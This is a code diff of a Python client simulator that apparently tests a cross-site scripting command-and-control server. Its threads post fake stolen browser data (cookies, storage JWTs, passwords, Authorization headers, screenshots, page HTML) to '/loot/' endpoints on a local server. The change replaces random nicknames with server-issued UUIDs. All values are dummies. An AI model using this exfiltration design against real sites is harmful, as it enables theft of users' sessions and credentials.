@@ -12,7 +12,7 @@ import base64
 # holds up
 
 
-numClients = 30
+numClients = 1
 
 
 randStartRange = 1
@@ -23,85 +23,6 @@ apiServer = "https://127.0.0.1:8444"
 victimApp = "https://vulnerableapp.com"
 
 
-
-AdjectiveList = {
-		"funky",
-		"smelly",
-		"skunky",
-		"merry",
-		"whimsical",
-		"amusing",
-		"hysterical",
-		"bumfuzzled",
-		"bodacious",
-		"absurd",
-		"animated",
-		"brazen",
-		"cheesy",
-		"clownish",
-		"confident",
-		"crazy",
-		"cuckoo",
-		"deranged",
-		"ludicrous",
-		"playful",
-		"quirky",
-		"screwball",
-		"slapstick",
-		"wacky",
-		"excited",
-		"humorous",
-		"charming",
-		"confident",
-		"fanatical"
-}
-
-ColorList = {
-		"blue",
-		"red",
-		"green",
-		"white",
-		"black",
-		"brown",
-		"azure",
-		"pink",
-		"yellow",
-		"silver",
-		"purple",
-		"orange",
-		"grey",
-		"fuchsia",
-		"crimson",
-		"lime",
-		"plum",
-		"olive",
-		"cyan",
-		"ivory",
-		"magenta"
-}
-
-
-MurderCritter = {
-		"kangaroo",
-		"koala",
-		"dropbear",
-		"wombat",
-		"wallaby",
-		"dingo",
-		"emu",
-		"tassiedevil",
-		"platypus",
-		"salty",
-		"kookaburra",
-		"boxjelly",
-		"blueringoctopus",
-		"taipan",
-		"stonefish",
-		"redback",
-		"cassowary",
-		"funnelwebspider",
-		"conesnail"
-}
 
 
 fakeHtml = """
@@ -148,7 +69,7 @@ Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac tu
 """
 
 
-with open('./nottaRealScreenshot.png', 'rb') as image_file:
+with open('./clientSimulatorScreenshot.png', 'rb') as image_file:
 	screenshotData = image_file.read()
 
 
@@ -157,13 +78,9 @@ class Client(threading.Thread):
 	def __init__(self, client_id):
 		super().__init__()
 		self.client_id = client_id
+		self.getUUID()
 
-		randomAdjective = random.choice(list(AdjectiveList))
-		randomColor     = random.choice(list(ColorList))
-		randomCritter   = random.choice(list(MurderCritter))
-
-		self.nickname = randomAdjective + '-' + randomColor + '-' + randomCritter
-		print("Client " + str(self.client_id) + " nickname: " + self.nickname)
+		print("Client " + str(self.client_id) + " UUID: " + self.uuid)
 
 		self._running  = True
 
@@ -210,6 +127,16 @@ class Client(threading.Thread):
 			time.sleep(sleepAmount)
 
 
+	def getUUID(self):
+		print("Retrieving UUID")
+		req = requests.get(apiServer + '/client/getToken', verify=False)
+		if req.status_code == 200:
+			data = req.json()
+			print(data)
+			self.uuid = data["clientToken"]
+		else:
+			print("Failed to receive UUID")
+
 
 	def stop(self):
 		print("Stopping client thread...")
@@ -218,7 +145,7 @@ class Client(threading.Thread):
 
 	def cookieEvent(self):
 		print("Sending cookie...")
-		req = requests.post(apiServer + '/loot/dessert/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/dessert/' + self.uuid, json={
 			"cookieName": "cookieMonster",
 			"cookieValue": "goYum"
 			}, verify=False)
@@ -226,7 +153,7 @@ class Client(threading.Thread):
 
 	def localStorageEvent(self):
 		print("Sending local storage event...")
-		req = requests.post(apiServer + '/loot/localstore/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/localstore/' + self.uuid, json={
 			"key": "localStorageKey",
 			"value": "localStorageSuperSecretJWTValue"
 			}, verify=False)
@@ -234,7 +161,7 @@ class Client(threading.Thread):
 
 	def sessionStorageEvent(self):
 		print("Sending session storage event...")
-		req = requests.post(apiServer + '/loot/sessionstore/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/sessionstore/' + self.uuid, json={
 			"key": "sessionStorageKey",
 			"value": "sessionStorageSuperSecretJWTValue"
 			}, verify=False)
@@ -243,14 +170,14 @@ class Client(threading.Thread):
 
 	def urlEvent(self):
 		print("Sending URL event...")
-		req = requests.post(apiServer + '/loot/location/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/location/' + self.uuid, json={
 			"url": victimApp + "/totesDashboard"
 			}, verify=False)
 
 
 	def htmlEvent(self):
 		print("Sending HTML event...")
-		req = requests.post(apiServer + '/loot/html/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/html/' + self.uuid, json={
 			"url": victimApp + "/totesDashboard",
 			"html": fakeHtml
 			}, verify=False)
@@ -260,14 +187,14 @@ class Client(threading.Thread):
 		print("Sending screenshot event...")
 
 		header = {'Content-Type': 'image/png'}
-		req = requests.post(apiServer + '/loot/screenshot/' + self.nickname, 
+		req = requests.post(apiServer + '/loot/screenshot/' + self.uuid, 
 			data = screenshotData, 
 			headers=header, verify=False)
 
 
 	def userInputEvent(self):
 		print("Sending user input event...")
-		req = requests.post(apiServer + '/loot/input/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/input/' + self.uuid, json={
 			"inputName": "secretPassword",
 			"inputValue": "MyVoiceIsMyPassport"
 			}, verify=False)
@@ -275,7 +202,7 @@ class Client(threading.Thread):
 
 	def xhrOpenEvent(self):
 		print("Sending XHR Open event...")
-		req = requests.post(apiServer + '/loot/xhrOpen/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/xhrOpen/' + self.uuid, json={
 			"method": "POST",
 			"url": victimApp + "/sensitiveAPI/secretShit"
 			}, verify=False)
@@ -283,12 +210,12 @@ class Client(threading.Thread):
 
 	def xhrSetHeaderEvent(self):
 		print("Sending XHR Header Event...")
-		req = requests.post(apiServer + '/loot/xhrSetHeader/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/xhrSetHeader/' + self.uuid, json={
 			"header": "Authorization",
 			"value": "SECRET_JWT_VALUE"
 			}, verify=False)
 
-		req = requests.post(apiServer + '/loot/xhrSetHeader/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/xhrSetHeader/' + self.uuid, json={
 			"header": "RandomHeader",
 			"value": "SomethingOrAnother"
 			}, verify=False)
@@ -305,7 +232,7 @@ class Client(threading.Thread):
 		requestBody  = base64.b64encode(requestString.encode())
 		responseBody = base64.b64encode(responseString.encode())
 
-		req = requests.post(apiServer + '/loot/xhrCall/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/xhrCall/' + self.uuid, json={
 			"requestBody": requestBody.decode(),
 			"responseBody": responseBody.decode()
 			}, verify=False)
@@ -313,7 +240,7 @@ class Client(threading.Thread):
 
 	def fetchSetupEvent(self):
 		print("Sending Fetch Setup Event...")
-		req = requests.post(apiServer + '/loot/fetchSetup/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/fetchSetup/' + self.uuid, json={
 			"method": "POST",
 			"url": victimApp + "/sensitiveAPI/fetchSecretShit"
 			}, verify=False)
@@ -321,7 +248,7 @@ class Client(threading.Thread):
 
 	def fetchHeaderEvent(self):
 		print("Sending Fetch Header Event...")
-		req = requests.post(apiServer + '/loot/fetchHeader/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/fetchHeader/' + self.uuid, json={
 			"header": "Authorization",
 			"value":"SECRET_JWT_VALUE"
 			}, verify=False)
@@ -331,21 +258,13 @@ class Client(threading.Thread):
 	def fetchCallEvent(self):
 		print("Sending Fetch Call Event...")
 
-		# requestBody = base64.b64encode("{'something':'fetchSomething value', 'something else': 'fetch some other value'}")
-		# responseBody = base64.b64encode("{'responseSomething':'something value', 'responseSomething else': 'some other value'}")
-
-		# req = requests.post(apiServer + '/loot/fetchCall/' + self.nickname, json={
-		# 	"requestBody": requestBody,
-		# 	"responseBody": responseBody
-		# 	}, verify=False)
-
 		requestString  = "{'something':'fetchSomething value', 'something else': 'fetch some other value'}"
 		responseString = "{'responseSomething':'something value', 'responseSomething else': 'some other value'}"
 
 		requestBody  = base64.b64encode(requestString.encode())
 		responseBody = base64.b64encode(responseString.encode())
 
-		req = requests.post(apiServer + '/loot/fetchCall/' + self.nickname, json={
+		req = requests.post(apiServer + '/loot/fetchCall/' + self.uuid, json={
 			"requestBody": requestBody.decode(),
 			"responseBody": responseBody.decode()
 			}, verify=False)
